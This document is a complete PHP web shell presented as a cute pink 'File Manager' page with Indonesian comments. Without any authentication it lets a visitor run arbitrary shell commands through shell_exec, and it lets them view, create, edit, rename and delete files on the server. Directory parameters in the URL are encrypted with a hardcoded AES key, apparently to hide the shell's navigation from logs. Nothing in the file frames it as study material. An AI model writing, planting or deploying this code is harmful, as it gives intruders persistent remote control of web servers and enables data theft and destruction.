<!DOCTYPE html>
<html>
<head>
    <title>nyan 🌸🎀</title>
    <link href="https://fonts.googleapis.com/css?family=Protest+Revolution" rel="stylesheet">
    <link href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Protest Revolution', sans-serif;
            background-color: #ffe6f0;
            color: #ff66b2;
            margin: 0;
            padding: 0;
            text-shadow: 2px 2px 4px rgba(255, 192, 203, 0.5);
        }
        .container {
            max-width: 800px;
            margin: 20px auto;
            padding: 20px;
            background-color: #fff0f5;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(255, 182, 193, 0.5);
        }
        .result-box {
            width: 97.5%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Protest Revolution', sans-serif;
            background-color: #ffe6f0;
            padding: 10px;
            border: 2px solid #ffccdd;
            margin-bottom: 10px;
            color: #ff1493;
        }
        hr {
            border: 0;
            border-top: 2px dashed #ffb6c1;
            margin: 20px 0;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            background-color: #ffe6f0;
        }
        th, td {
            padding: 10px;
            text-align: left;
            color: #ff69b4;
        }
        th {
            background-color: #ffb6c1;
        }
        tr:nth-child(even) {
            background-color: #ffe6f0;
        }
        tr:hover {
            background-color: #ffb6c1;
        }
        input[type="text"], input[type="submit"], textarea[name="file_content"] {
            width: calc(100% - 10px);
            margin-bottom: 10px;
            padding: 10px;
            max-height: 200px;
            resize: vertical;
            border: 2px solid #ffb6c1;
            border-radius: 10px;
            font-family: 'Protest Revolution', sans-serif;
            background-color: #fff0f5;
            color: #ff66b2;
        }
        input[type="submit"] {
            background-color: #ff69b4;
            color: #fff;
            font-family: 'Protest Revolution', sans-serif;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            padding: 10px 20px;
        }
        input[type="submit"]:hover {
            background-color: #ff1493;
        }
        .item-name {
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .folder-icon, .file-icon {
            margin-right: 10px;
        }
        .title {
            font-size: 2rem;
            text-align: center;
            color: #ff69b4;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="title">🎀🌸 File Manager 🌸🎀</div>
    <?php
    // Direktori root
    $rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);

    // Fungsi enkripsi & dekripsi
    function encrypt($plaintext, $key) {
        $iv_length = openssl_cipher_iv_length('aes-256-cbc');
        $iv = openssl_random_pseudo_bytes($iv_length);
        $encrypted = openssl_encrypt($plaintext, 'aes-256-cbc', $key, 0, $iv);
        return base64_encode($encrypted . '::' . $iv);
    }

    function decrypt($ciphertext, $key) {
        list($encrypted_data, $iv) = explode('::', base64_decode($ciphertext), 2);
        return openssl_decrypt($encrypted_data, 'aes-256-cbc', $key, 0, $iv);
    }

    // Kunci enkripsi
    $key = '4b8e5e9f48c2f5a63b4c1e3a1f4a2b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2';

    // Dekripsi data GET
    foreach ($_GET as $c => $d) $_GET[$c] = decrypt($d, $key);

    // Direktori saat ini
    $currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
    chdir($currentDirectory);

    $viewCommandResult = '';

    // Fungsi utama berdasarkan POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Membuat folder
        if (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
            $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
            if (!file_exists($newFolder)) {
                mkdir($newFolder);
                echo '<hr>Folder 🎀🌷 berhasil dibuat!';
            } else {
                echo '<hr>Error: Folder sudah ada 🎀🦩!';
            }
        }
        // Membuat file baru
        elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
            $newFile = $currentDirectory . '/' . $_POST['file_name'];
            if (!file_exists($newFile)) {
                if (file_put_contents($newFile, '') !== false) {
                    echo '<hr>File 💕 berhasil dibuat!';
                } else {
                    echo '<hr>Error: Gagal membuat file 💕!';
                }
            } else {
                echo '<hr>Error: File sudah ada 🌸!';
            }
        }
        // Mengedit file
        elseif (isset($_POST['edit_file'], $_POST['file_content'])) {
            $fileToEdit = $currentDirectory . '/' . $_POST['edit_file'];
            if (file_exists($fileToEdit)) {
                if (!empty($_POST['file_content'])) {
                    if (file_put_contents($fileToEdit, $_POST['file_content']) !== false) {
                        echo '<hr>File 💕 berhasil diedit!';
                    } else {
                        echo '<hr>Error: Gagal mengedit file 💕!';
                    }
                } else {
                    echo '<hr>Error: Isi file tidak boleh kosong 🦩!';
                }
            } else {
                echo '<hr>Error: File tidak ditemukan 🌸!';
            }
        }
        // Menghapus file atau folder
        elseif (isset($_POST['delete_file'])) {
            $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
            if (file_exists($fileToDelete)) {
                if (unlink($fileToDelete)) {
                    echo '<hr>File 💕 berhasil dihapus!';
                } elseif (is_dir($fileToDelete)) {
                    if (deleteDirectory($fileToDelete)) {
                        echo '<hr>Folder 🎀 berhasil dihapus!';
                    } else {
                        echo '<hr>Error: Gagal menghapus folder 🎀!';
                    }
                } else {
                    echo '<hr>Error: File atau direktori tidak ditemukan 🦩!';
                }
            }
        }
        // Mengganti nama
        elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
            $oldName = $currentDirectory . '/' . $_POST['old_name'];
            $newName = $currentDirectory . '/' . $_POST['new_name'];
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    echo '<hr>Item berhasil diubah namanya 🌸🎀!';
                } else {
                    echo '<hr>Error: Gagal mengganti nama item 💕!';
                }
            } else {
                echo '<hr>Error: Item tidak ditemukan 🌸!';
            }
        }
        // Menjalankan command shell
        elseif (isset($_POST['cmd_input'])) {
            $command = $_POST['cmd_input'];
            $output = shell_exec($command);
            $viewCommandResult = '<hr><p>Hasil 🌷:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
        }
        // Melihat file
        elseif (isset($_POST['view_file'])) {
            $fileToView = $currentDirectory . '/' . $_POST['view_file'];
            if (file_exists($fileToView)) {
                $fileContent = file_get_contents($fileToView);
                $viewCommandResult = '<hr><p>Isi file 🌸 ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
            } else {
                echo '<hr>Error: File tidak ditemukan 🌸!';
            }
        }
    }

    // Form input
    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="folder_name" placeholder="Create New Folder 🎀"><input type="submit" value="Create Folder 🌸"></form>';
    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="file_name" placeholder="Create New File 💕"><input type="submit" value="Create File 🎀"></form>';
    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="edit_file" placeholder="Edit Existing File 🦩"><textarea name="file_content" placeholder="File Content 🌷"></textarea><input type="submit" value="Edit File 💕"></form>';
    echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="text" name="cmd_input" placeholder="Enter command 💕"><input type="submit" value="Run Command 🎀"></form>';
    
    echo $viewCommandResult;

    // Tabel direktori
    echo '<table border=1>';
    echo '<br><tr><th>Item Name 🌸</th><th>Size 🎀</th><th>View 🦩</th><th>Delete 💕</th><th>Rename 🌷</th></tr>';
    foreach (scandir($currentDirectory) as $v) {
        $u = realpath($v);
        $s = stat($u);
        $itemLink = is_dir($v) ? '?d=' . encrypt($currentDirectory . '/' . $v, $key) : '?'.('d='.encrypt($currentDirectory, $key).'&f='.encrypt($v, $key));
        echo '<tr><td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td><td>'.$s['size'].'</td><td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value="View 🦩"></form></td><td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" value="Delete 💕"></form></td><td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" placeholder="New Name 🌷"><input type="submit" name="rename_item" value="Rename 🌸"></form></td></tr>';
    }
    echo '</table>';

    // Fungsi untuk menghapus folder dan file
    function deleteDirectory($dir) {
        if (!file_exists($dir)) {
            return true;
        }
        if (!is_dir($dir)) {
            return unlink($dir);
        }
        foreach (scandir($dir) as $item) {
            if ($item == '.' || $item == '..') {
                continue;
            }
            if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
                return false;
            }
        }
        return rmdir($dir);
    }
    ?>
</div>
</body>
</html>
